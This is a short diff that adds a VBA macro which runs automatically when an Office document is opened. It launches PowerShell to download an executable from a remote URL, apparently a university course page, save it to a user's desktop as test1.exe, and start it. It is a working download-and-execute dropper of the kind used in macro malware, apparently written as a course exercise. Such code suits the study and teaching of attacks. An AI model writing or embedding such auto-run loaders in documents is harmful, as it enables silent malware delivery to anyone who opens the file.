@@ -1,0 +1,5 @@
+Private Sub Document_Open()
+
+ a = Shell(“C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoExit -command (New-Object System.Net.WebClient).DownloadFile(‘https://staff.csie.ncu.edu.tw/hsufh/COURSES/SPRING2022/calc.exe’,‘C:\Users\john9\OneDrive\桌面\test1.exe’) ; Start-Process (‘C:\Users\john9\OneDrive\桌面\test1.exe’) ")
+
+End Sub
